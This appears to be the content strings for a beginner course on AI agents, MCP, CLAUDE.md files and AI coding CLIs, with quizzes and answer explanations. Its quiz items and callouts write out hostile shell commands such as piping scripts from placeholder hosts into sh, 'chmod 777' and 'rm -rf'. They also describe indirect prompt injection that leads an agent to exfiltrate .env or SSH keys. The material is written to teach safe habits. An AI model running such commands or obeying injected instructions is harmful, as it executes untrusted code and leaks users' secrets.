Reads are NOT automatically harmless: protect `.env`/private files from exfiltration, watch for indirect prompt injection in untrusted docs, and keep least-privilege scopes + human approvals active.

quiz.question: Why is MCP (Model Context Protocol) often nicknamed "USB-C for AI"?
options: It encrypts local `.env` files when a laptop charges.
It replaces the LLM with fixed local scripts.
It offers one open standard so any compatible AI harness can connect to external tools.
It forces every cloud AI provider to bill input and output tokens at the exact same flat rate.
quiz.explanation: Just like USB-C ended mismatched proprietary chargers, MCP gives AI harnesses and external tools one shared open protocol so integrations work across apps.

quiz.question: Giving an AI agent read-only access to all your files and the public web is always completely harmless because it cannot edit anything directly.
options: True
False
quiz.explanation: False! Reading `.env` or private files risks leaking secrets, and reading untrusted web pages or emails can trigger indirect prompt injection that hijacks other tools.

quiz.question: Sam connects an AI agent to his work email and calendar via MCP and turns on "Auto-approve sending emails" after two good test runs. What risk did he overlook?
options: Email MCP servers are unable to read message subjects unless auto-approve is turned off.
Auto-approving external sends lets a misunderstanding or hidden prompt injection fire off real emails unchecked.
Enabling auto-approve forces the harness to switch from a fast model to a slower reasoning tier.
MCP connections automatically expire after five minutes whenever email send permissions are granted.
quiz.explanation: External actions like sending emails or messages affect real people immediately—and untrusted incoming messages can contain prompt injections. Let AI draft, and keep human approval ON before sending.

chapters.title: How AI Agents Loop: Think, Act, Observe, Approve
chapters.summary: A regular chatbot speaks once and stops. An AI agent runs in a self-correcting loop—thinking, using a tool, checking real feedback, pausing for your approval, and repeating until the job works.

analogy.title: Assembling a Bookshelf One Check at a Time
analogy.body: Nobody builds a bookshelf with their eyes closed in one motion. You look at the manual (Think), tighten two screws (Act), give the shelf a gentle wiggle to see if it holds straight (Observe), and tighten a loose bolt before moving on. An AI agent works the same way—checking real feedback after every step instead of guessing blindly.

sections.heading: Single-shot chat vs. the multi-step Agent Loop
sections.body:
In a traditional one-turn chat, you ask a question and the AI takes a single blind swing. If its first draft has a typo, the chat just ends and leaves you stuck.

An **AI Agent** wraps the model in a repeating loop:

1. **Think**: Break the goal into the next concrete step.
2. **Act**: Request a tool call (read a file, edit CSS, run a test).
3. **Observe**: Read the real output—did the check pass, or did an error appear?
4. **Repeat (or Finish)**: If an error popped up, adjust the plan and try again; once verified, present a clear summary.

callout.title: Watching an agent fix a real bug in 4 beats
callout.body:
Goal: "Make the newsletter form validate emails."
• Loop 1: Reads `form.js` to see existing code.
• Loop 2: Adds email validation + pauses for your diff approval.
• Loop 3: Runs tests—spots a typo on line 18 in the error output.
• Loop 4: Fixes line 18, re-runs tests -> All green -> Reports Done.

sections.heading: Human-in-the-Loop: you stay the pilot
sections.body:
People sometimes picture "AI Agents" as runaway robots doing mysterious things unsupervised. In everyday building, reliable agents work as **collaborative co-pilots** with **Human-in-the-Loop** checkpoints.

Whenever the agent wants to edit a file, install a package, or run a command, it pauses and shows you the exact action. You approve only what makes sense—or redirect it before anything changes.

callout.title: Give the agent a way to verify its own work
callout.body: Agents become dramatically more reliable the moment they can **observe** real results. Pairing edits with an automated test or validation check lets the agent catch its own slips immediately.

sections.heading: When agents get stuck—and how to unstick them fast
sections.body:
Occasionally an agent falls into a spin, trying the same failing fix three times in a row. As the human pilot, stop the loop early and reset direction:

• Ask for a diagnosis first: *"Pause editing. Explain in 3 plain sentences why this error keeps happening."*
• Shrink the scope to one tiny, verifiable step.
• Compact or clear cluttered context if the thread has been spinning for a while.

callout.title: Never leave an unguarded agent looping unattended
callout.body: Every loop step resends the growing conversation back to the model—multiplying token usage fast. Supervise agents, keep retry/step caps tight, and interrupt early if it repeats itself.

keyTakeaways: An AI agent runs a repeating Think -> Act -> Observe loop so it can inspect real results and fix mistakes instead of guessing once.
Human-in-the-Loop checkpoints keep you in the driver’s seat, approving edits, installs, and commands before they execute.
If an agent repeats a failing step twice, stop it early to save tokens, ask for a plain-English diagnosis, and narrow the step.

quiz.question: What is the core repeating cycle of a standard AI Agent Loop?
options: Think -> Act via tool -> Observe real output -> Adjust or finish
Retrain weights -> Download new parameters -> Clear memory -> Restart session
Generate full app -> Skip verification -> Deploy live -> Wait for user complaints
Read whole hard drive -> Auto-approve all commands -> Compress files -> Close chat
quiz.explanation: The power of an agent comes from observing real feedback (file contents, error logs, test results) after each action and adapting until the goal is verified.

quiz.question: Using an AI agent means you must let it make unlimited changes automatically without ever reviewing or approving its actions.
options: True
False
quiz.explanation: False! Human-in-the-Loop approvals are a core feature of safe AI harnesses—you stay in charge and approve file edits or commands as you go.

quiz.question: An agent tries the exact same failing command four times in a row while building Leo’s app. Leo walks away for lunch hoping attempt #25 works. What should Leo have done instead?
options: Raised temperature to 1.0 so command syntax varies randomly.
Turned on auto-approve so retries run without pausing.
Deleted the entire Git repository history so the agent starts without seeing earlier checkpoints.
Stopped the loop early, asked for a plain diagnosis, and narrowed the task.
quiz.explanation: An agent stuck repeating a failed step burns tokens on every turn without progressing. Interrupt early, ask for a plain-English diagnosis, and narrow the step.

chapters.title: Instruction Files (`CLAUDE.md`), Rules & Skills
chapters.summary: Tired of repeating your project preferences every session? Learn how plain-English instruction files like `CLAUDE.md`, rules, and reusable skills guide your AI—and where real security boundaries actually live.

analogy.title: The Fridge Note vs. The Recipe Card Box
analogy.body: Imagine hiring a house-sitter. Taped on the fridge is a short welcome note (`CLAUDE.md` / Rules): "Water the fern on Tuesdays, use plain styling, explain changes simply." Tucked in a drawer is a recipe card box (Skills): specialized checklists opened only when needed. Crucially, a fridge note is a friendly reminder—real security still comes from actual door locks (harness permissions & sandboxing).

sections.heading: What is `CLAUDE.md` (or `AGENTS.md`)?
sections.body:
Because every fresh AI session starts with a clean desk, repeating *"This site uses plain HTML and CSS, keep explanations jargon-free, and always run tests"* gets old fast.

Modern AI harnesses solve this with a plain-English markdown file at the root of your project—called **`CLAUDE.md`** in Claude Code (and `AGENTS.md` or rules files in other tools). Whenever you start a new session in that folder, the harness loads those conventions automatically onto the AI’s desk.

callout.title: A clean, beginner-friendly `CLAUDE.md` in 5 lines
callout.body:
```markdown
# My Cafe Website
- Built with plain HTML, CSS, and vanilla JS (no extra frameworks).
- Warm cream background (#FFFBF5) and dark espresso text.
- Explain every edit in clear, jargon-free English.
- Ask before installing any package, and explain how to verify each change.
```

sections.heading: Rules vs. Skills—and what `CLAUDE.md` CANNOT enforce
sections.body:
As projects grow, dumping 500 lines into one always-on file clogs the context window on every single turn. Split instructions into two clean buckets:

• **Rules (always-on)**: Short, universal project conventions (stack, style, test command). Keep them lean!
• **Skills (on-demand playbooks)**: Detailed step-by-step checklists loaded ONLY when relevant—like a "Pre-Deploy QA Checklist" or "Accessibility Contrast Audit."

Just as important: **`CLAUDE.md` is soft guidance, NOT a security sandbox!** Writing "never read `.env`" in markdown is a helpful hint, yet an LLM can forget or be tricked by prompt injection. Real security comes from **harness deny-lists, OS/container isolation, least-privilege tokens, and human approval**.

callout.title: Markdown instructions are conventions—not hard locks
callout.body: Never rely solely on a line in `CLAUDE.md` to protect API keys, production databases, or files outside your folder. Enforce real boundaries in your harness permission settings and OS/account scopes.

sections.heading: Keep instruction files short and evolving
sections.body:
You do not have to write a perfect instruction file on day one. Many CLIs offer a starter command (like `/init`) that scans your project layout and drafts a concise starting note you can trim.

Whenever the AI repeats a style mistake—such as adding an unnecessary library—add one clear bullet to `CLAUDE.md`. Concise, concrete plain English beats a 20-page manual every time.

callout.title: Myth Buster: "Instruction files have to be written in special computer code"
callout.body: Not at all! `CLAUDE.md`, rules, and skills are ordinary, clear English bullet points. If a smart human teammate would understand your note in 30 seconds, your AI tool will too.

keyTakeaways: `CLAUDE.md` (or `AGENTS.md`) automatically gives your AI harness your project layout, style, and workflow conventions at the start of every session.
Keep always-on Rules lean so they do not bloat the context window, and place specialized checklists into on-demand Skills.
Treat instruction files as soft guidance—enforce real security with harness permission rules, scoped credentials, and OS isolation.

quiz.question: Why should you NEVER rely solely on a line in `CLAUDE.md` saying "Never read `.env` or run destructive commands" as your only security protection?
options: Markdown files are ignored by AI harnesses unless every rule is written in JSON syntax.
Instruction files are soft prompt guidance, whereas real enforcement needs harness and OS permissions.
Harnesses only read `CLAUDE.md` after finishing all edits, never at the start of a session.
Adding security rules to `CLAUDE.md` automatically disables Git checkpoints for the folder.
quiz.explanation: Prompt instructions like `CLAUDE.md` guide style and habits, but models can misread or be steered by prompt injection. Real security requires harness permission deny-rules, scoped credentials, and OS/folder isolation.

quiz.question: You need to know a special programming language to write a helpful `CLAUDE.md` or Skill file.
options: True
False
quiz.explanation: False! Clear, concise everyday English bullet points are the very best format for `CLAUDE.md`, rules, and skills.

quiz.question: Elena pastes a 25-page company handbook covering ten unrelated projects into her `CLAUDE.md` file so the AI "knows everything." What problem will that create?
options: Harnesses reject any markdown file longer than twenty lines and refuse to launch the session.
It bloats every turn with irrelevant tokens—keep rules short and move niche guides to Skills.
The AI automatically uploads the entire `CLAUDE.md` file to public GitHub when saving diffs.
Large instruction files force the model into high-temperature brainstorming mode on every prompt.
quiz.explanation: Always-on instructions occupy the working desk on every turn! Keep `CLAUDE.md` lean and focused, and move specialized step-by-step guides into Skills loaded only when needed.

masteryCheck.title: Unit 4 Mastery Check
masteryCheck.subtitle: Prove you understand harnesses, tool calling, MCP, and real agent permission boundaries.

questions.question: Two coding tools call the exact same underlying LLM, yet Tool A reliably fixes bugs while Tool B keeps hallucinating line numbers. What best explains the gap?
options: Tool A’s harness loads real files, runs tests, and feeds real output back in a loop.
Tool A secretly retrains the model’s frozen weights every time you press Enter.
Tool B uses a slower Wi-Fi connection that drops half the model’s vocabulary tokens.
Tool A turns off all human approval checkpoints so the model skips reading files.
questions.explanation: Harness quality—how context is selected, which tools are wired up, and how test feedback enters the Think-Act-Observe loop—drives huge differences even on the exact same model.

questions.question: A teammate gives an AI agent unrestricted read access to his home directory and web browser, saying "Read-only permissions can never cause security harm." What are the real risks?
options: Read-only tools use ten times more output tokens than write tools on every request.
Reading `.env` or `~/.ssh` risks secret exfiltration, and untrusted pages carry prompt injection.
MCP servers automatically upgrade read-only permissions into admin access after ten minutes.
Read-only access stops the agent from seeing error logs whenever unit tests fail.
questions.explanation: Confidentiality and prompt injection matter even with read tools: sensitive files like `.env` or SSH keys can be exfiltrated via other tools, and untrusted web/repo text can smuggle hidden instructions.

questions.question: Where should a hard rule blocking an AI agent from reading `.env` or running destructive commands be enforced?
options: Only as an uppercase rule inside `CLAUDE.md`.
Inside a CSS comment in `styles.css` so the harness skips secret files automatically.
In harness permission rules, scoped tokens, and OS/folder isolation.
By raising the model’s temperature dial above 0.8 so it avoids risky defaults.
questions.explanation: `CLAUDE.md` is helpful soft guidance for coding conventions, not a security wall. Enforce hard boundaries in harness permissions, least-privilege credentials, and OS/sandbox controls.

questions.question: Your team has 40 pages of specialized deployment steps used only once a month. Where should those instructions live?
options: Pasted into `CLAUDE.md` so every single chat turn carries all 40 pages automatically.
Hardcoded inside the system prompt of every unrelated customer-support chatbot.
Deleted completely because AI agents work best with zero written checklists.
In an on-demand Skill loaded only when running a deployment.
questions.explanation: Keep always-on Rules (`CLAUDE.md`) brief and universal; place specialized playbooks into on-demand Skills so they do not bloat everyday context windows.

modules.title: Using Claude Code & AI CLIs
modules.subtitle: Conquer terminal anxiety and learn how to partner safely with AI coding CLIs inside a project folder.

chapters.title: No-Fear Intro to the Terminal (CLI)
chapters.summary: Movies make the terminal window look like hacker magic, yet it is just a text-based way to navigate folders. Learn the four everyday commands—and the real truth about terminal safety.

analogy.title: Pointing at Menu Pictures vs. Ordering by Name
analogy.body: Clicking icons in Finder or File Explorer is like pointing at glossy photos on a restaurant menu. Typing inside a terminal (CLI) is simply saying "One masala chai, please" out loud. Same computer, same folders—just faster, clearer, and able to work directly with AI coding tools.

sections.heading: What the terminal really is (and how to respect it safely)
sections.body:
If opening a dark window with a blinking cursor makes your stomach drop, you are in great company. The **Terminal** (Command Line or Shell) is simply a text conversation with your computer’s folders and programs.

Read-only navigation commands like `pwd` and `ls` are completely safe to explore. At the same time, respect one crucial reality: **unlike clicking Delete in a desktop window, destructive terminal commands often run immediately with NO confirmation prompt and NO Recycle Bin/Trash**! Commands like `rm`, overwriting with `mv` or `>`, or piping internet scripts (`curl ... | sh`) act right away—so read every command before pressing Enter.

callout.title: Myth Buster: "You must memorize 100 cryptic commands to use a terminal"
callout.body: Not even close! Most everyday work uses just **four** safe navigation commands 95% of the time—and you can always ask AI to explain any unfamiliar command word for word before you run it.

sections.heading: The Fabulous Four commands (learn them in 60 seconds)
sections.body:
Picture your computer’s folders as rooms inside a house. These four tiny commands let you walk around effortlessly:

• **`pwd`** (*Print Working Directory*): "Which room am I standing in right now?"
• **`ls`** (*List*): "What files and subfolders are inside this room?"
• **`cd folder-name`** (*Change Directory*): "Walk into that subfolder." (Type `cd ..` to step back out one level.)
• **`mkdir my-project`** (*Make Directory*): "Create a brand-new empty folder named `my-project`."

callout.title: A complete 10-second walk into a project folder
callout.body:
1. Type `pwd` -> `/home/you`
2. Type `mkdir my-site` -> creates a clean new folder
3. Type `cd my-site` -> steps inside
4. Type `ls` -> sees everything inside `my-site`
That is genuinely all it takes to get oriented!

sections.heading: Three comfort shortcuts that make the terminal feel cozy
sections.body:
Once you know the Fabulous Four, three keyboard habits turn the terminal from awkward into effortless:

1. **Up Arrow (`↑`)**: Cycles back through commands you already typed so you never retype long paths.
2. **Tab key (`Tab`)**: Auto-completes long folder and file names after 2–3 letters (fewer typos!).
3. **`Ctrl + C`**: The universal polite panic brake! If a command is running too long or you want to cancel a line you started typing, press `Ctrl + C` to interrupt it and get a clean prompt back.

callout.title: Quick phone drill: trace the four commands in your head
callout.body: Imagine opening a terminal in `/home/alex`. You want to create a `cafe-site` folder, step inside, and confirm your location. The exact sequence is `mkdir cafe-site` -> `cd cafe-site` -> `pwd`.

keyTakeaways: Four simple commands cover everyday navigation: `pwd` (where am I?), `ls` (what is here?), `cd` (move folder), and `mkdir` (create folder).
Unlike Trash/Recycle Bin clicks, destructive shell commands (`rm`, `mv` overwrite, `>`, `curl | sh`) often execute immediately without confirmation—always read before running.
Use `Tab` to autocomplete names, `Up Arrow` to recall commands, and `Ctrl + C` to interrupt a stuck command.

quiz.question: You just opened a terminal and want to check which exact folder you are currently standing inside. Which command do you type?
options: mkdir
pwd
cd ..
ls
quiz.explanation: `pwd` stands for Print Working Directory—it immediately prints the exact folder path your terminal is currently standing inside.

quiz.question: Destructive terminal commands like `rm` or redirecting with `>` always pause with a confirmation dialog and move files safely to the Recycle Bin first.
options: True
False
quiz.explanation: False! Many shell commands (`rm`, `mv` overwrites, `>` truncation, `git reset --hard`) act immediately with no prompt and no Recycle Bin—always read commands carefully before pressing Enter.

quiz.question: Maya wants to list the files inside her `portfolio` folder, so she opens the terminal in her home folder and types `ls` without running `cd portfolio`. Why does she not see `index.html`?
options: Her working directory is still home—she must run `cd portfolio` first.
The `ls` command hides web files like HTML and CSS unless you run it with administrator privileges.
Terminal sessions can only display folders created during the exact same session using `mkdir`.
Every `ls` command requires passing the full absolute path from `/` before showing any subfolder.
quiz.explanation: Terminal commands act on your current working directory! Check `pwd` and `cd` into your project folder before inspecting files or launching an AI CLI.

chapters.title: What Is Claude Code CLI & How to Scope It Safely
chapters.summary: Claude Code (and sibling AI CLIs like Gemini CLI and Codex CLI) puts an AI agent inside your project folder—removing copy-paste gymnastics while requiring disciplined folder scoping.

analogy.title: Inviting the Carpenter Inside One Specific Room
analogy.body: Using a browser chatbot to build software is like texting photos of a wobbly table to a carpenter across town and sawing the wood yourself. Using an AI CLI invites the carpenter right into your workshop to measure, propose cuts for approval, and check the result—which is why you invite them into ONE project room, never your whole house!

sections.heading: Why AI CLIs changed everything for beginners
sections.body:
With plain browser chatbots, beginners hit the same frustrating wall: copy code from chat -> paste into the wrong file -> miss one bracket -> paste the whole file back -> repeat 30 times.

**Claude Code CLI** (and similar terminal agents like Gemini CLI and OpenAI Codex CLI) runs directly inside your project folder so it can:

• Read your real files instead of guessing from pasted fragments
• Propose clean surgical edits with a red/green diff preview
• Run tests or check errors right in the terminal
• Pause calmly for your explicit **Yes / No** approval before modifying files or running commands

callout.title: The entire workflow starts with one focused command
callout.body: Walk into a dedicated project folder (`cd ~/Projects/my-website`), confirm with `pwd`, and launch the CLI (for example `claude`). The interactive prompt opens scoped right to that folder.

sections.heading: Installation, authentication, and folder trust
sections.body:
Setting up an AI CLI takes a couple of minutes when you are at a computer:

1. **Install only from official docs**: Use the provider’s official installer or documented package command—never copy-paste random install scripts from forum comments.
2. **Authenticate cleanly**: Sign in via the official browser login (eligible subscription) or connect a scoped, capped API key.
3. **Treat the "Trust this folder?" prompt seriously**: Untrusted downloads or random repositories can contain hidden hooks, build scripts, or tool configs—only trust folders whose files you actually know!

callout.title: Always `cd` into a dedicated project folder first!
callout.body: Never launch an AI coding CLI inside your top-level home folder (`/home/you`), Documents, or root (`/`). Keep each project in its own subfolder so personal tax PDFs, SSH keys, and unrelated files stay completely out of scope.

sections.heading: One mental model works across every AI CLI
sections.body: Even though this unit highlights **Claude Code CLI** for its clear diff approvals, the exact same habits transfer directly to **Gemini CLI**, **Codex CLI**, **OpenCode**, and AI editors like **Cursor** or **Antigravity**: isolate the folder -> explain first -> review diffs -> verify -> save a clean Git checkpoint.

callout.title: No desktop needed to master the workflow
callout.body: Every command, diff check, and Git safety habit you learn here is a mental checklist—once you recognize red/green diffs and safe scoping, using any real AI CLI feels natural on day one.

keyTakeaways: AI CLIs run inside your project folder to read files, propose red/green diff edits, and verify changes without tedious copy-paste cycles.
Always `cd` into a dedicated project subfolder—and only trust folders you know, since untrusted repos can hide malicious hooks or configs.
The same safe workflow (scope -> explain -> review diff -> verify -> commit) works across Claude Code, Gemini CLI, Codex CLI, and AI editors.

quiz.question: What is the main workflow advantage of an AI coding CLI inside a project folder over a plain browser chatbot?
options: It guarantees every API call is permanently free without any token metering or subscription.
It bypasses all approval prompts so edits are saved silently without showing you a diff.
It automatically deploys your private files and `.env` secrets to a live web server.
It reads project files, proposes diffs, and verifies changes directly without copy-pasting.
quiz.explanation: Running inside a scoped project folder lets the AI harness inspect real files, present surgical diffs for your approval, and verify changes cleanly—eliminating fragile copy-paste loops.

quiz.question: It is safe to click "Trust this folder" on any random zip file downloaded from the internet before inspecting what scripts or configs are inside.
options: True
False
quiz.explanation: False! Untrusted repositories or downloaded folders can contain malicious hooks, MCP configs, or build scripts that run commands when trusted—only trust folders you know.

quiz.question: Devon opens his terminal in his top-level `/home/devon` directory (holding personal tax PDFs, photos, and SSH keys) and runs an AI CLI saying "Clean up unused files." Why is that risky?
options: AI CLIs cannot read filenames containing spaces unless they live inside a Desktop subfolder.
Launching from the home directory exposes unrelated personal files and secrets—always isolate each project in its own subfolder.
Home directories automatically switch the AI model into read-only mode so no cleanup can run.
Running a CLI outside a Git repository doubles the per-token API price charged by the provider.
quiz.explanation: Scope is a real safety boundary! Always isolate each website or app inside its own dedicated subfolder and `cd` into it before launching an AI coding CLI.

chapters.title: Your First AI CLI Session: Explain, Edit, Review Diff & Undo
chapters.summary: Follow the calm four-beat rhythm every confident AI builder uses: ask the AI to explain first, request one small edit, read the red-and-green diff before approving, and checkpoint safely with Git.

analogy.title: Track Changes in Google Docs
analogy.body: When an editor suggests changes in Google Docs, old words show struck through in red and new words appear in green, with an Accept / Reject button beside them. An AI CLI **diff** works the exact same way—you never have to guess what changed or blindly accept edits.

sections.heading: Step 1: Start by asking the AI to EXPLAIN before editing
sections.body:
When you open a project folder in an AI CLI, your best opening prompt is NOT "rewrite everything." Start with curiosity:

*"Explain what files are in this folder and what each one does, in plain English—do not edit anything yet."*

In seconds, the agent gives you a plain map of the project AND proves it is standing in the right directory.

callout.title: Ask questions freely before touching code
callout.body: Asking "What does line 14 of styles.css do?" or "Why are you suggesting this change?" builds real intuition—and helps you spot weird suggestions before approving them.

sections.heading: Step 2 & 3: Request one focused edit and read the Diff
sections.body:
Next, ask for ONE concrete improvement at a time—for instance: *"Add a welcoming hero banner at the top of `index.html` with a green Get Started button."*

Before saving anything, the CLI displays a **Diff**:
• Lines starting with **`-`** in **red** are being removed or replaced.
• Lines starting with **`+`** in **green** are being added.
• Unchanged gray lines sit around them for context.

Confirm the filename is the one you expected, scan the changed text and colors, then press **Yes** to approve—or **No** to ask for a revision.

callout.title: Reading a 4-line diff takes 3 seconds
callout.body:
```diff
-

My Site

+

Welcome to Bean & Book Cafe

+ Explore Menu
``` Red = old title removed. Green = warm new title and button added. Clean, predictable, safe!

sections.heading: Step 4: The safety net—clean Git checkpoints without leaking secrets
sections.body:
What if you approve an edit, check the result, and prefer how it looked five minutes ago?

**Git** is a free snapshot system for your folder. Before trying a big experiment, save a clean checkpoint—**and ALWAYS inspect `git status` first instead of blindly running `git add .`**!

• **`git status`** -> Lists modified and untracked files so you immediately spot if `.env` or a stray private file is missing from `.gitignore`!
• **`git diff`** -> Shows every line changed since your last commit.
• Stage specific clean files (`git add index.html styles.css`) and commit (`git commit -m "Working homepage"`).
• To revert an unwanted edit safely, verify what will be discarded with `git diff` first, then restore that file (note: discarding uncommitted edits is permanent!).

callout.title: Never blindly run `git add .` without checking `git status`
callout.body: If `.gitignore` is missing or has a typo, `git add .` quietly stages `.env` and secret files right into your commit! Always run `git status` first and verify no secret files appear.

keyTakeaways: Start sessions by asking the AI CLI to explain the folder in plain English before editing anything.
Read the red (`-` removed) and green (`+` added) Diff and verify the target filename before pressing Approve.
Always check `git status` and `.gitignore` before staging—never blindly run `git add .`—and commit working milestones before big redesigns.

quiz.question: When an AI CLI shows a Diff preview before modifying a file, what do green lines prefixed with `+` indicate?
options: Lines with syntax errors being removed.
New lines that will be added if you approve.
Files that Git has already added to `.gitignore` to keep them private.
Read-only context lines copied from neighboring files that will stay unchanged.
quiz.explanation: In standard Diff views, red `-` lines are removals and green `+` lines are additions—just like Track Changes in a document.

quiz.question: Running `git add .` without checking `git status` first is always safe because Git automatically blocks any file containing an API key.
options: True
False
quiz.explanation: False! Local Git does NOT automatically detect API keys—if `.env` is missing from `.gitignore`, `git add .` stages it immediately. Always run `git status` first!

quiz.question: Chris opens an AI CLI in a 12-file project and enables blanket auto-approve without reading diffs or saving a Git commit. Halfway through, the site breaks and he cannot tell what changed. What two habits would have protected him?
options: Saving a clean Git commit first and reviewing small diffs one step at a time.
Turning off `.gitignore` and editing all files at once.
Running `git reset --hard` after every prompt to clear edits.
Switching to a higher temperature dial so the CLI explains changes in longer paragraphs.
quiz.explanation: Saving a clean Git checkpoint first and approving small, readable diffs one step at a time keeps every experiment calm and reversible!

chapters.title: Power Workflows: Planning, Exact Errors, `/compact` & Command Safety
chapters.summary: Level up from curious beginner to calm, security-minded builder with four everyday habits: plan before editing, share exact errors, compact context cleanly, and reject unsafe shell permissions.

analogy.title: Measure Twice, Cut Once—With Real Safety Guards
analogy.body: Great woodworkers do not grab a saw the instant they walk in. They sketch a quick plan (Plan Mode), inspect exact measurements (Exact Errors & Screenshots), sweep sawdust between tasks (`/compact`), and never disable the saw’s blade guard (Approval & Permission Safety).

sections.heading: Workflow 1: Plan first, edit second
sections.body:
When you want something bigger than a tiny tweak—say, adding dark mode plus saving the user’s preference—do NOT ask the AI to jump straight into editing five files at once.

Ask for a **plan first**: *"Do not edit any files yet. Propose a simple 3-step plan and list which files you will touch."* Many CLIs include a dedicated **Plan Mode** toggle. Reviewing a 5-line plan takes ten seconds and prevents 90% of messy detours.

callout.title: The magic phrase for calm building
callout.body: Start bigger requests with: **"Before changing code, explain your plan in 4 short bullets and wait for my go-ahead."**

sections.heading: Workflow 2: Paste exact error messages & screenshots (redacting secrets!)
sections.body:
When something looks crooked or throws a red error, skip *"It broke, fix it."* Give the AI two sharp clues:

1. **Copy-paste the exact error text** word for word (making sure no API keys, tokens, or passwords appear in the log!).
2. **Share a screenshot** so a multimodal model can literally see the overlapping button or squished mobile layout.

callout.title: Vague report vs. Pro bug report
callout.body:
Vague: "The button doesn’t work."
Pro: "When I click Calculate, nothing happens and the console shows: `TypeError: Cannot read properties of null (reading value) at script.js:29`. Explain why first, then apply the smallest fix."

sections.heading: Workflow 3 & 4: Sweep with `/compact` & NEVER disable safety approvals
sections.body:
After finishing one milestone, running **`/compact`** summarizes key decisions and clears noisy clutter from the context window, keeping the next task sharper and cheaper (and `/clear` resets completely for an unrelated task).

Most importantly, **never turn off permission guardrails for convenience**: avoid wildcard auto-allow flags (like `--dangerously-skip-permissions` or blanket `Bash(*)`), and pause on ANY command that:
• Pipes internet scripts into a shell (`curl ... | sh`)
• Deletes or forcefully overwrites files/history (`rm -rf`, `git push --force`, `git reset --hard`)
• Escalates privileges or loosens permissions (`sudo`, `chmod 777`)
• Reads sensitive paths (`~/.ssh`, `.env`, credential stores) or sends local data to unfamiliar URLs—especially after reading untrusted web docs or repos that could carry **prompt injection**!

callout.title: Think allowlist, not just a tiny denylist
callout.body: Dangerous commands go way beyond `rm -rf` and `sudo`! Never approve any shell command you do not understand, never turn on blanket wildcard shell access (`Bash(*)`), and inspect network, install, or permission-changing commands carefully.

keyTakeaways: Ask for a short plain-English plan BEFORE editing multiple files ("Measure twice, cut once").
Share exact (secret-redacted) error text and screenshots instead of vague descriptions like "it broke."

Use `/compact` between milestones, never enable wildcard auto-approve flags (`--dangerously-skip-permissions`, `Bash(*)`), and scrutinize every command touching files, permissions, Git history, secrets, or the network.

quiz.question: When is the best time to run `/compact` during a long AI CLI session?
options: Right after finishing a milestone so old clutter is summarized cleanly.
Before opening a folder, so `/compact` automatically creates your `.gitignore` and `.env` files.
Only when you want to permanently delete modified source files and roll back to an empty repo.
Every time you approve a single line change, because AI CLIs cannot handle two diffs in one chat.
quiz.explanation: `/compact` leaves your actual files untouched—it summarizes long conversation clutter into crisp notes between milestones so the context window stays sharp and affordable.

quiz.question: Turning on a wildcard flag like `--dangerously-skip-permissions` or blanket `Bash(*)` is a recommended beginner shortcut because `rm -rf` is the only risky shell command.
options: True
False
quiz.explanation: False! Many commands are risky—`curl | sh`, `chmod 777`, `git push --force`, `git reset --hard`, reading `~/.ssh`/`.env`, or prompt-injected network calls. Never grant blanket auto-approve!

quiz.question: While fixing a layout bug after pasting an external tutorial snippet, an AI CLI asks to run `curl https://unknown-site.example/fix.sh | sh` and `chmod 777 .`. Why should you immediately say No?
options: Because `curl` commands cannot download files smaller than one megabyte inside a local folder.
Piping an unverified script into a shell executes arbitrary code, and `chmod 777` exposes files to all local users.
Because CSS styling bugs can only be repaired using `git push --force` rather than shell commands.
Only because `sh` is deprecated and the command should be re-run with `sudo` instead.
quiz.explanation: Piping unknown internet scripts directly into a shell (`curl | sh`) runs unreviewed arbitrary code on your machine, and `chmod 777` makes files world-writable—and untrusted snippets can even contain prompt injection!

masteryCheck.title: Unit 5 Mastery Check
masteryCheck.subtitle: Check your command-line instincts: folder scoping, diffs, Git hygiene, and shell safety.

questions.question: You just downloaded an unfamiliar repository zip from a stranger online. What is the safest sequence before launching an AI coding CLI?
options: Launch the CLI in your top-level home folder and click "Trust" so it can inspect everything.
Enable `--dangerously-skip-permissions` first so the CLI can clean the folder quickly.
Inspect scripts/configs first, isolate it in its own subfolder, and never blindly trust.
Run `git add .` immediately before opening any files so Git encrypts the zip.
questions.explanation: Untrusted repos can hide malicious hooks, MCP configs, or build scripts. Isolate projects in a dedicated subfolder and inspect before trusting or running commands.

questions.question: After finishing a homepage header, Sam runs `git add . && git commit -m "done"` without checking `git status` or `.gitignore`. Why is that habit dangerous?
options: If `.gitignore` is missing or mistyped, `git add .` quietly stages `.env` secrets.
`git add .` deletes every CSS file in the folder unless you run `/compact` beforehand.
Git refuses to commit more than two files at a time unless you pass `--force`.
Checking `git status` is only needed when deploying to a paid custom `.com` domain.
questions.explanation: Always run `git status` and verify `.gitignore` covers `.env` before staging—never blindly stage everything with `git add .`.

questions.question: An AI CLI asks to run `git reset --hard HEAD~3` and `curl -s https://example.invalid/setup.sh | sh`. What makes BOTH commands risky?
options: They require a monthly consumer chat subscription rather than pay-as-you-go API credits.
One permanently wipes local commits without Trash, and the other executes unreviewed remote code.
Both commands only change font styling inside your terminal window without touching files.
Neither command runs unless you first type `pwd` and `ls` in the same terminal tab.
questions.explanation: `git reset --hard` permanently discards uncommitted work and rewinds commits without confirmation, while `curl | sh` executes unreviewed remote code straight in your shell.

questions.question: You want your AI CLI to add dark mode across four files after a long morning session. What is the cleanest workflow?
options: Turn on blanket `Bash(*)` auto-approve and ask it to rewrite all four files immediately.
Keep the bloated chat history and paste "make dark mode look nice" with no details.
Delete `.gitignore` so the CLI can read your system configuration files for theme colors.
Run `/compact`, ask for a short plan first, and review small diffs step by step.
questions.explanation: Compacting stale clutter, reviewing a concise plan before edits, and approving focused diffs one step at a time keeps multi-file changes accurate and reversible.

modules.title: Build a Website with AI
modules.subtitle: Go from blank idea to a polished, mobile-friendly website live on the internet—no prior coding required.

chapters.title: How Websites Work: HTML, CSS & JavaScript in 3 Minutes
chapters.summary: You do not need to memorize web code to build great websites with AI—you just need a 3-minute mental map of the three files inside every site so you know what to ask for.

analogy.title: Building a Cozy Cafe Storefront
analogy.body: Every website on Earth is built from the exact same three ingredients as a physical cafe. **HTML** is the wooden frame, walls, tables, and menu board (Structure). **CSS** is the warm paint, cozy lighting, fonts, and neat spacing (Style). **JavaScript** is the espresso machine, door chime, and cash register that actually respond when someone taps a button (Interactivity).

sections.heading: Meet the three friendly files inside a website folder
sections.body:
Open almost any beginner website folder and you will see just three plain-text files working together as a team:

• **`index.html` (HTML = Structure)**: Lists what exists on the page—headings, paragraphs, photos, links, and buttons. Every browser looks for `index.html` as the front door!
• **`styles.css` (CSS = Look & Feel)**: Controls colors, fonts, rounded corners, dark mode, and how columns stack neatly on phones.
• **`script.js` (JavaScript = Actions)**: Makes things happen when visitors interact—opening a mobile menu, toggling pricing monthly/yearly, or validating a contact form.

